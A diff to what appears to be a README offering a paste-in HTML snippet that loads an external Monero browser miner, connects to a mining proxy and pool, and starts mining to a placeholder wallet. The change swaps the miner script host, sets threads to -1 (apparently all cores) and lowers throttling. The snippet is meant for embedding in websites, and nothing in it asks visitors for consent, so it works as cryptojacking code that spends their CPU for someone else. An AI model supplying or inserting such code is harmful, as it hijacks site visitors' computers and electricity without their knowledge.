@@ -3,16 +3,16 @@
 ### See This Video For More Info : https://www.youtube.com/watch?v=AZU6TeEjHVQ
 ## `HTML SCRIPT`
 ```
-<script src="https://xmonitizer.vercel.app/index.js"></script>
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
-    var walletAddress = "YOUR-MONERO-ADRESS";
-    var workerId = "YOUR-WORKER-ID";
-    var threads = 1;
+    var walletAddress = "PUT YOUR WALLET ADDRESS HERE";
+    var workerId = ""
+    var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 30;
+    throttleMiner = 20;
 </script>
 ```
 ### Almost All Languages Supports Html Code Includelation .. Use This Code As Your Pride .. 
